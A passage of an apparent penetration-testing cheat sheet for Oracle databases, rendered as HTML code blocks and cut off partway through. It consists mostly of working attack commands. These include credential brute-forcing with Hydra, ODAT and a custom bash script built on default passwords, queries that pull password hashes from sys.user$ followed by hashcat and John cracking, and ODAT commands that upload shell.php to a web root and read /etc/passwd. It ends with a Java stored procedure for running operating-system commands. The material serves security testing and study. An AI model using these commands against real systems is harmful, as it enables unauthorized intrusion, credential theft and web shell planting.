</span><span id=__span-14-8><a id=__codelineno-14-8 name=__codelineno-14-8 href=#__codelineno-14-8></a><span class=c1>-- All system privileges</span>
</span><span id=__span-14-9><a id=__codelineno-14-9 name=__codelineno-14-9 href=#__codelineno-14-9></a><span class=k>SELECT</span><span class=w> </span><span class=n>grantee</span><span class=p>,</span><span class=w> </span><span class=n>privilege</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dba_sys_privs</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>grantee</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;SCOTT&#39;</span><span class=p>;</span>
</span><span id=__span-14-10><a id=__codelineno-14-10 name=__codelineno-14-10 href=#__codelineno-14-10></a>
</span><span id=__span-14-11><a id=__codelineno-14-11 name=__codelineno-14-11 href=#__codelineno-14-11></a><span class=c1>-- Role information</span>
</span><span id=__span-14-12><a id=__codelineno-14-12 name=__codelineno-14-12 href=#__codelineno-14-12></a><span class=k>SELECT</span><span class=w> </span><span class=n>granted_role</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_role_privs</span><span class=p>;</span>
</span><span id=__span-14-13><a id=__codelineno-14-13 name=__codelineno-14-13 href=#__codelineno-14-13></a><span class=k>SELECT</span><span class=w> </span><span class=k>role</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dba_roles</span><span class=p>;</span>
</span><span id=__span-14-14><a id=__codelineno-14-14 name=__codelineno-14-14 href=#__codelineno-14-14></a>
</span><span id=__span-14-15><a id=__codelineno-14-15 name=__codelineno-14-15 href=#__codelineno-14-15></a><span class=c1>-- Administrative users</span>
</span><span id=__span-14-16><a id=__codelineno-14-16 name=__codelineno-14-16 href=#__codelineno-14-16></a><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dba_users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=k>IN</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;SYS&#39;</span><span class=p>,</span><span class=s1>&#39;SYSTEM&#39;</span><span class=p>,</span><span class=s1>&#39;SYSMAN&#39;</span><span class=p>,</span><span class=s1>&#39;DBSNMP&#39;</span><span class=p>);</span>
</span></code></pre></div> <h3 id=system-information-queries>System Information Queries<a class=headerlink href=#system-information-queries title="Permanent link">&para;</a></h3> <h4 id=database-schema-enumeration>Database Schema Enumeration<a class=headerlink href=#database-schema-enumeration title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-15-1><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a><span class=c1>-- List all tables accessible to current user</span>
</span><span id=__span-15-2><a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a><span class=k>SELECT</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=p>;</span>
</span><span id=__span-15-3><a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a>
</span><span id=__span-15-4><a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a><span class=c1>-- List tables owned by current user</span>
</span><span id=__span-15-5><a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a><span class=k>SELECT</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_tables</span><span class=p>;</span>
</span><span id=__span-15-6><a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a>
</span><span id=__span-15-7><a id=__codelineno-15-7 name=__codelineno-15-7 href=#__codelineno-15-7></a><span class=c1>-- List all schemas/users with tables</span>
</span><span id=__span-15-8><a id=__codelineno-15-8 name=__codelineno-15-8 href=#__codelineno-15-8></a><span class=k>SELECT</span><span class=w> </span><span class=k>DISTINCT</span><span class=w> </span><span class=k>owner</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=k>owner</span><span class=p>;</span>
</span><span id=__span-15-9><a id=__codelineno-15-9 name=__codelineno-15-9 href=#__codelineno-15-9></a>
</span><span id=__span-15-10><a id=__codelineno-15-10 name=__codelineno-15-10 href=#__codelineno-15-10></a><span class=c1>-- Get table structure</span>
</span><span id=__span-15-11><a id=__codelineno-15-11 name=__codelineno-15-11 href=#__codelineno-15-11></a><span class=k>DESCRIBE</span><span class=w> </span><span class=k>table_name</span><span class=p>;</span>
</span><span id=__span-15-12><a id=__codelineno-15-12 name=__codelineno-15-12 href=#__codelineno-15-12></a><span class=k>SELECT</span><span class=w> </span><span class=k>column_name</span><span class=p>,</span><span class=w> </span><span class=n>data_type</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tab_columns</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;TABLE_NAME&#39;</span><span class=p>;</span>
</span></code></pre></div> <h4 id=sensitive-data-discovery>Sensitive Data Discovery<a class=headerlink href=#sensitive-data-discovery title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-16-1><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=c1>-- Search for tables with specific names</span>
</span><span id=__span-16-2><a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a><span class=k>SELECT</span><span class=w> </span><span class=k>owner</span><span class=p>,</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;%USER%&#39;</span><span class=p>;</span>
</span><span id=__span-16-3><a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a><span class=k>SELECT</span><span class=w> </span><span class=k>owner</span><span class=p>,</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;%PASS%&#39;</span><span class=p>;</span>
</span><span id=__span-16-4><a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a><span class=k>SELECT</span><span class=w> </span><span class=k>owner</span><span class=p>,</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;%CRED%&#39;</span><span class=p>;</span>
</span><span id=__span-16-5><a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a>
</span><span id=__span-16-6><a id=__codelineno-16-6 name=__codelineno-16-6 href=#__codelineno-16-6></a><span class=c1>-- Search for columns with sensitive names</span>
</span><span id=__span-16-7><a id=__codelineno-16-7 name=__codelineno-16-7 href=#__codelineno-16-7></a><span class=k>SELECT</span><span class=w> </span><span class=k>table_name</span><span class=p>,</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tab_columns</span><span class=w> </span>
</span><span id=__span-16-8><a id=__codelineno-16-8 name=__codelineno-16-8 href=#__codelineno-16-8></a><span class=k>WHERE</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;%PASS%&#39;</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;%PWD%&#39;</span><span class=p>;</span>
</span><span id=__span-16-9><a id=__codelineno-16-9 name=__codelineno-16-9 href=#__codelineno-16-9></a>
</span><span id=__span-16-10><a id=__codelineno-16-10 name=__codelineno-16-10 href=#__codelineno-16-10></a><span class=c1>-- Find views</span>
</span><span id=__span-16-11><a id=__codelineno-16-11 name=__codelineno-16-11 href=#__codelineno-16-11></a><span class=k>SELECT</span><span class=w> </span><span class=n>view_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_views</span><span class=p>;</span>
</span></code></pre></div> <hr> <h2 id=credential-attacks>Credential Attacks<a class=headerlink href=#credential-attacks title="Permanent link">&para;</a></h2> <h3 id=brute-force-attacks>Brute Force Attacks<a class=headerlink href=#brute-force-attacks title="Permanent link">&para;</a></h3> <h4 id=hydra>Hydra<a class=headerlink href=#hydra title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-17-1><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=c1># Oracle TNS brute force</span>
</span><span id=__span-17-2><a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a>hydra<span class=w> </span>-L<span class=w> </span>users.txt<span class=w> </span>-P<span class=w> </span>passwords.txt<span class=w> </span>oracle-listener://target
</span><span id=__span-17-3><a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a>
</span><span id=__span-17-4><a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a><span class=c1># Single user attack</span>
</span><span id=__span-17-5><a id=__codelineno-17-5 name=__codelineno-17-5 href=#__codelineno-17-5></a>hydra<span class=w> </span>-l<span class=w> </span>system<span class=w> </span>-P<span class=w> </span>passwords.txt<span class=w> </span>oracle-listener://target
</span><span id=__span-17-6><a id=__codelineno-17-6 name=__codelineno-17-6 href=#__codelineno-17-6></a>
</span><span id=__span-17-7><a id=__codelineno-17-7 name=__codelineno-17-7 href=#__codelineno-17-7></a><span class=c1># Specify SID</span>
</span><span id=__span-17-8><a id=__codelineno-17-8 name=__codelineno-17-8 href=#__codelineno-17-8></a>hydra<span class=w> </span>-L<span class=w> </span>users.txt<span class=w> </span>-P<span class=w> </span>passwords.txt<span class=w> </span>oracle-listener://target:1521/XE
</span></code></pre></div> <h4 id=custom-oracle-brute-force-script>Custom Oracle Brute Force Script<a class=headerlink href=#custom-oracle-brute-force-script title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-18-1><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a><span class=ch>#!/bin/bash</span>
</span><span id=__span-18-2><a id=__codelineno-18-2 name=__codelineno-18-2 href=#__codelineno-18-2></a><span class=c1># Oracle brute force script</span>
</span><span id=__span-18-3><a id=__codelineno-18-3 name=__codelineno-18-3 href=#__codelineno-18-3></a>
</span><span id=__span-18-4><a id=__codelineno-18-4 name=__codelineno-18-4 href=#__codelineno-18-4></a><span class=nv>TARGET</span><span class=o>=</span><span class=nv>$1</span>
</span><span id=__span-18-5><a id=__codelineno-18-5 name=__codelineno-18-5 href=#__codelineno-18-5></a><span class=nv>SID</span><span class=o>=</span><span class=nv>$2</span>
</span><span id=__span-18-6><a id=__codelineno-18-6 name=__codelineno-18-6 href=#__codelineno-18-6></a><span class=nv>USERS</span><span class=o>=(</span><span class=s2>&quot;system&quot;</span><span class=w> </span><span class=s2>&quot;sys&quot;</span><span class=w> </span><span class=s2>&quot;scott&quot;</span><span class=w> </span><span class=s2>&quot;hr&quot;</span><span class=w> </span><span class=s2>&quot;dbsnmp&quot;</span><span class=w> </span><span class=s2>&quot;oracle&quot;</span><span class=o>)</span>
</span><span id=__span-18-7><a id=__codelineno-18-7 name=__codelineno-18-7 href=#__codelineno-18-7></a><span class=nv>PASSWORDS</span><span class=o>=(</span><span class=s2>&quot;manager&quot;</span><span class=w> </span><span class=s2>&quot;change_on_install&quot;</span><span class=w> </span><span class=s2>&quot;tiger&quot;</span><span class=w> </span><span class=s2>&quot;hr&quot;</span><span class=w> </span><span class=s2>&quot;dbsnmp&quot;</span><span class=w> </span><span class=s2>&quot;oracle&quot;</span><span class=w> </span><span class=s2>&quot;password&quot;</span><span class=w> </span><span class=s2>&quot;admin&quot;</span><span class=o>)</span>
</span><span id=__span-18-8><a id=__codelineno-18-8 name=__codelineno-18-8 href=#__codelineno-18-8></a>
</span><span id=__span-18-9><a id=__codelineno-18-9 name=__codelineno-18-9 href=#__codelineno-18-9></a><span class=k>for</span><span class=w> </span>user<span class=w> </span><span class=k>in</span><span class=w> </span><span class=s2>&quot;</span><span class=si>${</span><span class=nv>USERS</span><span class=p>[@]</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>;</span><span class=w> </span><span class=k>do</span>
</span><span id=__span-18-10><a id=__codelineno-18-10 name=__codelineno-18-10 href=#__codelineno-18-10></a><span class=w>    </span><span class=k>for</span><span class=w> </span>pass<span class=w> </span><span class=k>in</span><span class=w> </span><span class=s2>&quot;</span><span class=si>${</span><span class=nv>PASSWORDS</span><span class=p>[@]</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>;</span><span class=w> </span><span class=k>do</span>
</span><span id=__span-18-11><a id=__codelineno-18-11 name=__codelineno-18-11 href=#__codelineno-18-11></a><span class=w>        </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;Testing </span><span class=nv>$user</span><span class=s2>:</span><span class=nv>$pass</span><span class=s2>&quot;</span>
</span><span id=__span-18-12><a id=__codelineno-18-12 name=__codelineno-18-12 href=#__codelineno-18-12></a><span class=w>        </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;SELECT 1 FROM dual;&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>sqlplus<span class=w> </span>-S<span class=w> </span><span class=nv>$user</span>/<span class=nv>$pass</span>@<span class=nv>$TARGET</span>:1521/<span class=nv>$SID</span><span class=w> </span><span class=m>2</span>&gt;/dev/null<span class=w> </span><span class=p>|</span><span class=w> </span>grep<span class=w> </span>-q<span class=w> </span><span class=s2>&quot;^1</span>$<span class=s2>&quot;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;[+] Valid: </span><span class=nv>$user</span><span class=s2>:</span><span class=nv>$pass</span><span class=s2>&quot;</span>
</span><span id=__span-18-13><a id=__codelineno-18-13 name=__codelineno-18-13 href=#__codelineno-18-13></a><span class=w>    </span><span class=k>done</span>
</span><span id=__span-18-14><a id=__codelineno-18-14 name=__codelineno-18-14 href=#__codelineno-18-14></a><span class=k>done</span>
</span></code></pre></div> <h4 id=odat-comprehensive-testing>ODAT Comprehensive Testing<a class=headerlink href=#odat-comprehensive-testing title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-19-1><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=c1># Test all ODAT modules</span>
</span><span id=__span-19-2><a id=__codelineno-19-2 name=__codelineno-19-2 href=#__codelineno-19-2></a>./odat.py<span class=w> </span>all<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE
</span><span id=__span-19-3><a id=__codelineno-19-3 name=__codelineno-19-3 href=#__codelineno-19-3></a>
</span><span id=__span-19-4><a id=__codelineno-19-4 name=__codelineno-19-4 href=#__codelineno-19-4></a><span class=c1># Specific password guessing</span>
</span><span id=__span-19-5><a id=__codelineno-19-5 name=__codelineno-19-5 href=#__codelineno-19-5></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>system<span class=w> </span>-P<span class=w> </span>passwords.txt
</span><span id=__span-19-6><a id=__codelineno-19-6 name=__codelineno-19-6 href=#__codelineno-19-6></a>
</span><span id=__span-19-7><a id=__codelineno-19-7 name=__codelineno-19-7 href=#__codelineno-19-7></a><span class=c1># User enumeration</span>
</span><span id=__span-19-8><a id=__codelineno-19-8 name=__codelineno-19-8 href=#__codelineno-19-8></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>--accounts-file<span class=w> </span>users.txt
</span></code></pre></div> <hr> <h2 id=advanced-techniques>Advanced Techniques<a class=headerlink href=#advanced-techniques title="Permanent link">&para;</a></h2> <h3 id=password-hash-extraction>Password Hash Extraction<a class=headerlink href=#password-hash-extraction title="Permanent link">&para;</a></h3> <h4 id=extract-user-hashes>Extract User Hashes<a class=headerlink href=#extract-user-hashes title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-20-1><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a><span class=c1>-- Oracle 10g/11g password hashes</span>
</span><span id=__span-20-2><a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=k>user</span><span class=err>$</span><span class=p>;</span>
</span><span id=__span-20-3><a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a>
</span><span id=__span-20-4><a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a><span class=c1>-- Oracle 12c+ password hashes</span>
</span><span id=__span-20-5><a id=__codelineno-20-5 name=__codelineno-20-5 href=#__codelineno-20-5></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>spare4</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=k>user</span><span class=err>$</span><span class=p>;</span>
</span><span id=__span-20-6><a id=__codelineno-20-6 name=__codelineno-20-6 href=#__codelineno-20-6></a>
</span><span id=__span-20-7><a id=__codelineno-20-7 name=__codelineno-20-7 href=#__codelineno-20-7></a><span class=c1>-- User account information</span>
</span><span id=__span-20-8><a id=__codelineno-20-8 name=__codelineno-20-8 href=#__codelineno-20-8></a><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>account_status</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dba_users</span><span class=p>;</span>
</span><span id=__span-20-9><a id=__codelineno-20-9 name=__codelineno-20-9 href=#__codelineno-20-9></a>
</span><span id=__span-20-10><a id=__codelineno-20-10 name=__codelineno-20-10 href=#__codelineno-20-10></a><span class=c1>-- Extract to file (if permissions allow)</span>
</span><span id=__span-20-11><a id=__codelineno-20-11 name=__codelineno-20-11 href=#__codelineno-20-11></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=o>||</span><span class=s1>&#39;:&#39;</span><span class=o>||</span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=k>user</span><span class=err>$</span><span class=p>;</span>
</span></code></pre></div> <h4 id=hash-cracking>Hash Cracking<a class=headerlink href=#hash-cracking title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-21-1><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a><span class=c1># Hashcat Oracle hash cracking</span>
</span><span id=__span-21-2><a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>hashcat<span class=w> </span>-m<span class=w> </span><span class=m>3100</span><span class=w> </span>hashes.txt<span class=w> </span>wordlist.txt<span class=w>    </span><span class=c1># Oracle 11g</span>
</span><span id=__span-21-3><a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a>hashcat<span class=w> </span>-m<span class=w> </span><span class=m>12300</span><span class=w> </span>hashes.txt<span class=w> </span>wordlist.txt<span class=w>   </span><span class=c1># Oracle 12c+</span>
</span><span id=__span-21-4><a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a>
</span><span id=__span-21-5><a id=__codelineno-21-5 name=__codelineno-21-5 href=#__codelineno-21-5></a><span class=c1># John the Ripper</span>
</span><span id=__span-21-6><a id=__codelineno-21-6 name=__codelineno-21-6 href=#__codelineno-21-6></a>john<span class=w> </span>--format<span class=o>=</span>oracle11<span class=w> </span>hashes.txt
</span><span id=__span-21-7><a id=__codelineno-21-7 name=__codelineno-21-7 href=#__codelineno-21-7></a>john<span class=w> </span>--format<span class=o>=</span>oracle12c<span class=w> </span>hashes.txt
</span></code></pre></div> <h3 id=file-system-operations>File System Operations<a class=headerlink href=#file-system-operations title="Permanent link">&para;</a></h3> <h4 id=file-upload-via-utl_file>File Upload via UTL_FILE<a class=headerlink href=#file-upload-via-utl_file title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-22-1><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a><span class=c1>-- Check UTL_FILE_DIR parameter</span>
</span><span id=__span-22-2><a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a><span class=k>SELECT</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$parameter</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;utl_file_dir&#39;</span><span class=p>;</span>
</span><span id=__span-22-3><a id=__codelineno-22-3 name=__codelineno-22-3 href=#__codelineno-22-3></a>
</span><span id=__span-22-4><a id=__codelineno-22-4 name=__codelineno-22-4 href=#__codelineno-22-4></a><span class=c1>-- Create file</span>
</span><span id=__span-22-5><a id=__codelineno-22-5 name=__codelineno-22-5 href=#__codelineno-22-5></a><span class=k>DECLARE</span>
</span><span id=__span-22-6><a id=__codelineno-22-6 name=__codelineno-22-6 href=#__codelineno-22-6></a><span class=w>  </span><span class=n>f</span><span class=w> </span><span class=n>UTL_FILE</span><span class=p>.</span><span class=n>FILE_TYPE</span><span class=p>;</span>
</span><span id=__span-22-7><a id=__codelineno-22-7 name=__codelineno-22-7 href=#__codelineno-22-7></a><span class=k>BEGIN</span>
</span><span id=__span-22-8><a id=__codelineno-22-8 name=__codelineno-22-8 href=#__codelineno-22-8></a><span class=w>  </span><span class=n>f</span><span class=w> </span><span class=p>:</span><span class=o>=</span><span class=w> </span><span class=n>UTL_FILE</span><span class=p>.</span><span class=n>FOPEN</span><span class=p>(</span><span class=s1>&#39;/tmp&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;test.txt&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;W&#39;</span><span class=p>);</span>
</span><span id=__span-22-9><a id=__codelineno-22-9 name=__codelineno-22-9 href=#__codelineno-22-9></a><span class=w>  </span><span class=n>UTL_FILE</span><span class=p>.</span><span class=n>PUT_LINE</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;Test content&#39;</span><span class=p>);</span>
</span><span id=__span-22-10><a id=__codelineno-22-10 name=__codelineno-22-10 href=#__codelineno-22-10></a><span class=w>  </span><span class=n>UTL_FILE</span><span class=p>.</span><span class=n>FCLOSE</span><span class=p>(</span><span class=n>f</span><span class=p>);</span>
</span><span id=__span-22-11><a id=__codelineno-22-11 name=__codelineno-22-11 href=#__codelineno-22-11></a><span class=k>END</span><span class=p>;</span>
</span><span id=__span-22-12><a id=__codelineno-22-12 name=__codelineno-22-12 href=#__codelineno-22-12></a><span class=o>/</span>
</span></code></pre></div> <h4 id=odat-file-operations>ODAT File Operations<a class=headerlink href=#odat-file-operations title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-23-1><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=c1># Upload file</span>
</span><span id=__span-23-2><a id=__codelineno-23-2 name=__codelineno-23-2 href=#__codelineno-23-2></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--putFile<span class=w> </span>/var/www/html<span class=w> </span>shell.php<span class=w> </span>./shell.php
</span><span id=__span-23-3><a id=__codelineno-23-3 name=__codelineno-23-3 href=#__codelineno-23-3></a>
</span><span id=__span-23-4><a id=__codelineno-23-4 name=__codelineno-23-4 href=#__codelineno-23-4></a><span class=c1># Download file</span>
</span><span id=__span-23-5><a id=__codelineno-23-5 name=__codelineno-23-5 href=#__codelineno-23-5></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--getFile<span class=w> </span>/etc/passwd<span class=w> </span>passwd.txt
</span><span id=__span-23-6><a id=__codelineno-23-6 name=__codelineno-23-6 href=#__codelineno-23-6></a>
</span><span id=__span-23-7><a id=__codelineno-23-7 name=__codelineno-23-7 href=#__codelineno-23-7></a><span class=c1># Check file permissions</span>
</span><span id=__span-23-8><a id=__codelineno-23-8 name=__codelineno-23-8 href=#__codelineno-23-8></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--test-all
</span></code></pre></div> <h3 id=java-stored-procedures>Java Stored Procedures<a class=headerlink href=#java-stored-procedures title="Permanent link">&para;</a></h3> <h4 id=execute-system-commands>Execute System Commands<a class=headerlink href=#execute-system-commands title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-24-1><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a><span class=c1>-- Enable Java</span>
</span><span id=__span-24-2><a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a><span class=k>SELECT</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$parameter</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;java_pool_size&#39;</span><span class=p>;</span>
</span><span id=__span-24-3><a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a>
</span><span id=__span-24-4><a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a><span class=c1>-- Create Java class for command execution</span>
</span><span id=__span-24-5><a id=__codelineno-24-5 name=__codelineno-24-5 href=#__codelineno-24-5></a><span class=k>CREATE</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=k>REPLACE</span><span class=w> </span><span class=n>JAVA</span><span class=w> </span><span class=k>SOURCE</span><span class=w> </span><span class=n>NAMED</span><span class=w> </span><span class=ss>&quot;CommandExec&quot;</span><span class=w> </span><span class=k>AS</span>
</span><span id=__span-24-6><a id=__codelineno-24-6 name=__codelineno-24-6 href=#__codelineno-24-6></a><span class=n>import</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=n>io</span><span class=p>.</span><span class=o>*</span><span class=p>;</span>
</span><span id=__span-24-7><a id=__codelineno-24-7 name=__codelineno-24-7 href=#__codelineno-24-7></a><span class=k>public</span><span class=w> </span><span class=k>class</span><span class=w> </span><span class=n>CommandExec</span><span class=w> </span><span class=err>{</span>
</span><span id=__span-24-8><a id=__codelineno-24-8 name=__codelineno-24-8 href=#__codelineno-24-8></a><span class=w>    </span><span class=k>public</span><span class=w> </span><span class=k>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>execCmd</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=p>)</span><span class=w> </span><span class=err>{</span>
</span><span id=__span-24-9><a id=__codelineno-24-9 name=__codelineno-24-9 href=#__codelineno-24-9></a><span class=w>        </span><span class=n>try</span><span class=w> </span><span class=err>{</span>
</span><span id=__span-24-10><a id=__codelineno-24-10 name=__codelineno-24-10 href=#__codelineno-24-10></a><span class=w>            </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=n>getRuntime</span><span class=p>().</span><span class=k>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span>
</span><span id=__span-24-11><a id=__codelineno-24-11 name=__codelineno-24-11 href=#__codelineno-24-11></a><span class=w>            </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>p</span><span class=p>.</span><span class=n>getInputStream</span><span class=p>()));</span>
</span><span id=__span-24-12><a id=__codelineno-24-12 name=__codelineno-24-12 href=#__codelineno-24-12></a><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span>
</span><span id=__span-24-13><a id=__codelineno-24-13 name=__codelineno-24-13 href=#__codelineno-24-13></a><span class=w>            </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span>
